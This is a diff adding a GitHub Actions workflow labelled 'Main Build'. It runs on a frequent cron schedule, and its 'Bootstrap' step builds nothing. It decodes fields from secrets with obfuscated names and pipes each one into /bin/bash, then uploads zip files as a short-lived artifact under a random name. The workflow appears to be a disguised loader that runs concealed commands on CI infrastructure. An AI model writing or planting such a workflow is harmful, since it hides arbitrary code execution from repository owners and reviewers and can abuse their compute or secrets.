@@ -1,0 +1,36 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '8 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          gs9190: ${{ secrets.gs9190 }}
+        run: |
+          printf '%s' "$gs9190" | jq -r .gdof28752 | /bin/bash
+          echo $v1 | jq -r .q70433 | /bin/bash
+          echo $mz2422 | jq -r .p4 | /bin/bash
+          printf '%s' "$eqxr19538" | jq -r .gov7 | /bin/bash
+          printf '%s' "$dhmzd639" | jq -r .fpkv61 | /bin/bash
+          printf '%s' "$wajwm602" | jq -r .g81 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 14Di8Kab
+          path: "*.zip"
+          retention-days: 1
